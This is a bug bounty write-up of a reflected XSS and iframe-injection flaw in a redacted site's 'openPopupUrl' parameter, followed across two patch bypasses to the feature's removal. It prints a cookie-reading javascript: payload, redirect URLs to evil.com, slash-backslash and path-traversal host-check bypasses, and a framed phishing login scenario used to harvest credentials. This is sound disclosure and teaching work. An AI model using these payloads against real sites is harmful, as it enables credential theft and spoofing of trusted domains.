# From Reflected XSS & Iframe Injection to Feature Removal: A 3-Stage Patch Bypass

- **Target:** https://redacted.com/
- **Vulnerable Endpoint:** /create-order
- **Vulnerable Parameter:** openPopupUrl
- **Severity:** Medium (Reflected XSS, Iframe Injection, Phishing)
- **Outcome:** 3x Bug Bounty Rewards and Complete Feature Removal

---

## Introduction

Bug bounty hunting is often viewed as a straightforward process of finding a bug, reporting it, and watching it get fixed. However, the real engineering battle usually begins *after* the first patch. 

This writeup details a fascinating 3-stage vulnerability lifecycle discovered in targets’s file transfer application. Through incomplete patches, regex blacklists, and parser differentials, a single client-side parameter evolved from a **Reflected XSS** into a persistent **Iframe Injection / Open Redirect** vector—ultimately forcing the vendor to delete the unused feature entirely.

---

## Stage 1: Reflected XSS & Open Redirect

### The Discovery
While inspecting the client-side JavaScript logic handling modals and popups, I noticed the openPopupUrl parameter being directly read from the URL and passed into a DOM attribute without adequate sanitization:

$(document).ready(function() {
    var url = getPageParameter("openPopupUrl");
    if(url){
        $('#autoopenpopup').attr("href", url);
        $('#autoopenpopup').click();
    }
});

### The Flaw
Because the parameter accepted arbitrary URI schemes, it was immediately clear that supplying javascript: URIs would execute JavaScript within the application's origin, while data: or external HTTP/HTTPS URIs would trigger an Open Redirect and UI spoofing.

### Initial Proof of Concept (PoC)
https://redacted.com/path/create-order?openPopupUrl=javascript:alert%28document.cookie%29

https://redacted.com/path/create-order?&openPopupUrl=https://evil.com

- **Result:** Reported, validated as a valid security risk, and marked as resolved after the vendor's first patch attempt. **(1st Bounty)**

---

## Stage 2: The First Patch Bypass (Normalization Trick)

### The Vendor's First Fix
The development team attempted to secure the parameter by implementing a host-checking mechanism (e.g., verifying that the URL's host matched the application domain). However, they relied on flawed validation logic rather than robust URL parsing.

### The Bypass
By leveraging URL normalization quirks—specifically using prefix slash-backslash combinations (/\)—the JavaScript validation parser evaluated the input as local or relative, while the browser eventually resolved it externally.

### Bypass PoC
https://redacted.com/path/create-order?&openPopupUrl=/\evil.com

- **Result:** The patch was proven incomplete. Reported, validated, and rewarded. **(2nd Bounty)**

---

## Stage 3: The Second Patch Bypass

### The Vendor's Second Fix
Following the second report, the vendor implemented a stricter parser.host validation check using a standard JavaScript anchor element (document.createElement('a')).

### The Parser Differential
As security researchers know, client-side validation parsers often disagree with the browser's final rendering engine. By combining relative path traversal sequences (../../../../) with backslashes (\\), I found that:

- **Validation Phase:** The anchor parser considered the URL to be relative or local, passing the host check successfully.
- **Execution Phase:** When assigned to the iframe.src attribute, the browser normalized the backslashes into standard forward slashes (//), resulting in a cross-origin request.

### Advanced Phishing PoC
To demonstrate the severe business risk, I constructed a realistic phishing scenario:

1. Hosted a rogue login template on an external server (e.g., webhook.site) with application/xhtml+xml content type.
2. Triggered the payload via the vulnerable endpoint:
   https://redacted.com/path/create-order?openPopupUrl=../../../../\\webhook.site/[ID]
3. **The Impact:** The victim's browser rendered an authentic-looking login prompt inside a modal dialog directly under the trusted redacted.com domain. Because the address bar continuously displayed the legitimate green-lock domain, users had no visual indicator of the spoofing attempt, making it trivial to harvest credentials.

- **Result:** Reported the parser differential along with comprehensive remediation options. **(3rd Bounty)**

---

## The Ultimate Remediation: Feature Removal

Rather than entering an endless cat-and-mouse game of regex patches, blacklists, and parser tweaks, the development team conducted a deeper architectural review based on the final report.

They realized that the openPopupUrl parameter served no legitimate operational purpose whatsoever.

- **The Final Fix:** The vendor permanently removed the parameter and its associated client-side parsing logic from the application.
- **Takeaway:** *The most secure code is the code you delete.* Eliminating unused functionality entirely shrinks the attack surface and permanently closes the vector.
